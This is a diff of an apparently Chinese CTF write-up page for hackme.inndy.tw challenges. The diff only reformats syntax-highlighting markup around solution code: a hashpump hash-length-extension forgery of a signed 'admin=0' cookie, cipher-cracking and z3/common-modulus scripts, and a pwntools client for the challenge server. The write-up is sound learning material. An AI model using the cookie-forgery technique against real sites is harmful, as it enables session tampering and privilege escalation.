+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">list</span><span class="p">(</span><span class="nv">$sig</span><span class="p">,</span> <span class="nv">$serialized</span><span class="p">)</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;#&#39;</span><span class="p">,</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]),</span> <span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span><span class="o">.</span><span class="nv">$serialized</span><span class="p">)</span> <span class="o">!==</span> <span class="nv">$sig</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$error</span> <span class="o">=</span> <span class="s1">&#39;Invalid session&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$serialized</span><span class="p">,</span> <span class="nv">$user</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$user</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这个时候就要用到 <em>哈希长度扩展攻击</em> 了</p>
 <blockquote>
@@ -1520,10 +1520,10 @@ Tips: What is symmetric cipher?</p>
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">▶ hashpump -s 6bcb9c9155975a53e951b0b50f137480 -d &#39;name=guest&amp;admin=0&#39; -a &#39;illya&#39; -k 32
-4b6fe69cd0880b2e01e609d8ed9fd30a
-name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00illya
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">▶ hashpump -s 6bcb9c9155975a53e951b0b50f137480 -d &#39;name=guest&amp;admin=0&#39; -a &#39;illya&#39; -k 32
+</span></span><span class="line"><span class="cl">4b6fe69cd0880b2e01e609d8ed9fd30a
+</span></span><span class="line"><span class="cl">name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00illya
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>比较迷的一点是, 一开始在 Chrome 里直接改 Cookie 然后刷新似乎不行 = =. 最后用 httpie 提交才获得了 flag. orz</p>
 <h2 id="xor">xor</h2>
@@ -1548,13 +1548,13 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">crack</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
-        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mh">0xb1</span> <span class="o">+</span> <span class="mh">0x1b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="o">==</span> <span class="n">n</span><span class="p">:</span>
-            <span class="k">return</span> <span class="n">i</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="n">crack</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">crypted</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crack</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mh">0xb1</span> <span class="o">+</span> <span class="mh">0x1b</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="o">==</span> <span class="n">n</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="n">crack</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">crypted</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>得到后直接放参数里运行</p>
 <h2 id="ffa">ffa</h2>
@@ -1589,29 +1589,29 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 </span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">json</span>
-<span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;crypted&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
-    <span class="nb">globals</span><span class="p">()[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
-    
-<span class="n">solver</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
-
-<span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="n">BitVecs</span><span class="p">(</span><span class="s1">&#39;a b c&#39;</span><span class="p">,</span> <span class="mi">262</span><span class="p">)</span>
-<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="p">[</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">]:</span>
-    <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">_</span> <span class="o">&gt;=</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">m</span><span class="p">))</span>
-    <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">_</span> <span class="o">&lt;</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">257</span><span class="p">,</span> <span class="n">m</span><span class="p">))</span>
-<span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">a</span> <span class="o">+</span> <span class="n">b</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span> <span class="o">==</span> <span class="n">x</span><span class="p">)</span>
-<span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">b</span> <span class="o">-</span> <span class="n">c</span> <span class="o">*</span> <span class="mi">5</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span> <span class="o">==</span> <span class="n">y</span><span class="p">)</span>
-<span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">a</span> <span class="o">+</span> <span class="n">c</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span> <span class="o">==</span> <span class="n">z</span><span class="p">)</span>
-
-<span class="n">models</span> <span class="o">=</span> <span class="p">[]</span>
-<span class="k">while</span> <span class="n">solver</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
-    <span class="n">m</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
-    <span class="nb">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
-    <span class="n">models</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
-    <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Or</span><span class="p">(</span><span class="n">a</span> <span class="o">!=</span> <span class="n">m</span><span class="p">[</span><span class="n">a</span><span class="p">],</span> <span class="n">b</span> <span class="o">!=</span> <span class="n">m</span><span class="p">[</span><span class="n">b</span><span class="p">],</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">m</span><span class="p">[</span><span class="n">c</span><span class="p">]))</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;crypted&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">globals</span><span class="p">()[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="n">solver</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="n">BitVecs</span><span class="p">(</span><span class="s1">&#39;a b c&#39;</span><span class="p">,</span> <span class="mi">262</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="p">[</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">_</span> <span class="o">&gt;=</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">m</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">_</span> <span class="o">&lt;</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">257</span><span class="p">,</span> <span class="n">m</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">a</span> <span class="o">+</span> <span class="n">b</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span> <span class="o">==</span> <span class="n">x</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">b</span> <span class="o">-</span> <span class="n">c</span> <span class="o">*</span> <span class="mi">5</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span> <span class="o">==</span> <span class="n">y</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">a</span> <span class="o">+</span> <span class="n">c</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span> <span class="o">==</span> <span class="n">z</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">models</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">solver</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">models</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Or</span><span class="p">(</span><span class="n">a</span> <span class="o">!=</span> <span class="n">m</span><span class="p">[</span><span class="n">a</span><span class="p">],</span> <span class="n">b</span> <span class="o">!=</span> <span class="n">m</span><span class="p">[</span><span class="n">b</span><span class="p">],</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">m</span><span class="p">[</span><span class="n">c</span><span class="p">]))</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这次还好, 只有一组值.</p>
 <div class="highlight"><div class="chroma">
@@ -1620,9 +1620,9 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
-<span class="n">q</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">q</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>于是现在变成了已知 p, q, a, b, M, 求 flag.  <del>气氛突然 RSA 了起来.</del></p>
 <p>和 RSA 的共模攻击很像,  <del>照着 CTF wiki  的代码抄一遍</del></p>
@@ -1641,18 +1641,18 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="n">gcdext</span><span class="p">,</span> <span class="n">invert</span>
-<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
-
-<span class="n">a</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">a</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
-<span class="n">b</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">b</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
-
-<span class="n">gcd</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">t</span> <span class="o">=</span> <span class="n">gcdext</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">=</span> <span class="o">-</span><span class="n">s</span> <span class="c1"># 此处 s &lt; 0</span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">invert</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
-<span class="n">plain</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span> <span class="o">%</span> <span class="n">M</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">plain</span><span class="p">))</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="n">gcdext</span><span class="p">,</span> <span class="n">invert</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">a</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">b</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gcd</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">t</span> <span class="o">=</span> <span class="n">gcdext</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="o">-</span><span class="n">s</span> <span class="c1"># 此处 s &lt; 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">invert</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">plain</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">M</span><span class="p">)</span> <span class="o">%</span> <span class="n">M</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">plain</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h1 id="programming">Programming</h1>
 <h2 id="fast">fast</h2>
@@ -1662,8 +1662,8 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nc hackme.inndy.tw 7707
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc hackme.inndy.tw 7707
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>How fast could you be?</p>
 </blockquote>
@@ -1712,41 +1712,41 @@ name=guest&amp;admin=0\x80\x00\x00\x00\x00\x00\x90\x01\x00\x00\x00\x00\x00\x00il
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-cython" data-lang="cython"><span class="o">%%</span><span class="n">cython</span> 
-<span class="k">import</span> <span class="nn">cython</span>
-<span class="k">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
-
-<span class="nd">@cython</span><span class="o">.</span><span class="n">cdivision</span><span class="p">(</span><span class="bp">True</span><span class="p">)</span>
-<span class="k">def</span> <span class="nf">_eval</span><span class="p">(</span><span class="nb">int</span> <span class="n">a</span><span class="p">,</span> <span class="n">op</span><span class="p">,</span> <span class="nb">int</span> <span class="n">b</span><span class="p">):</span>
-    <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="n">b</span><span class="s">&#39;+&#39;</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span>
-    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="n">b</span><span class="s">&#39;-&#39;</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">a</span> <span class="o">-</span> <span class="n">b</span>
-    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="n">b</span><span class="s">&#39;*&#39;</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span>
-    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="n">b</span><span class="s">&#39;/&#39;</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">a</span> <span class="o">/</span> <span class="n">b</span>
-
-<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#39;hackme.inndy.tw&#39;</span><span class="p">,</span> <span class="mf">7707</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;start the game.</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;Yes I know&#39;</span><span class="p">)</span>
-
-<span class="n">exps</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
-
-<span class="k">while</span> <span class="n">exps</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="mf">10000</span><span class="p">:</span>
-    <span class="n">exps</span> <span class="o">+=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">exps</span> <span class="o">=</span> <span class="n">exps</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
-
-<span class="n">ans</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">exps</span><span class="p">)):</span>
-    <span class="n">exp</span> <span class="o">=</span> <span class="n">exps</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
-    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">exp</span><span class="p">[</span><span class="mf">0</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">exp</span><span class="p">[</span><span class="mf">2</span><span class="p">])</span>
-    <span class="n">op</span> <span class="o">=</span> <span class="n">exp</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span>
-    <span class="n">ans</span> <span class="o">+=</span> <span class="n">f</span><span class="s">&#39;{_eval(a, op, b)}</span><span class="se">\n</span><span class="s">&#39;</span>
-<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cython" data-lang="cython"><span class="line"><span class="cl"><span class="o">%%</span><span class="n">cython</span> 
+</span></span><span class="line"><span class="cl"><span class="k">import</span> <span class="nn">cython</span>
+</span></span><span class="line"><span class="cl"><span class="k">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@cython</span><span class="o">.</span><span class="n">cdivision</span><span class="p">(</span><span class="bp">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_eval</span><span class="p">(</span><span class="nb">int</span> <span class="n">a</span><span class="p">,</span> <span class="n">op</span><span class="p">,</span> <span class="nb">int</span> <span class="n">b</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">op</span> <span class="o">==</span> <span class="n">b</span><span class="s">&#39;+&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="n">b</span><span class="s">&#39;-&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">a</span> <span class="o">-</span> <span class="n">b</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="n">b</span><span class="s">&#39;*&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">op</span> <span class="o">==</span> <span class="n">b</span><span class="s">&#39;/&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">a</span> <span class="o">/</span> <span class="n">b</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#39;hackme.inndy.tw&#39;</span><span class="p">,</span> <span class="mf">7707</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;start the game.</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;Yes I know&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exps</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">exps</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="mf">10000</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exps</span> <span class="o">+=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">exps</span> <span class="o">=</span> <span class="n">exps</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ans</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">exps</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exp</span> <span class="o">=</span> <span class="n">exps</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">exp</span><span class="p">[</span><span class="mf">0</span><span class="p">]),</span> <span class="nb">int</span><span class="p">(</span><span class="n">exp</span><span class="p">[</span><span class="mf">2</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">op</span> <span class="o">=</span> <span class="n">exp</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span>
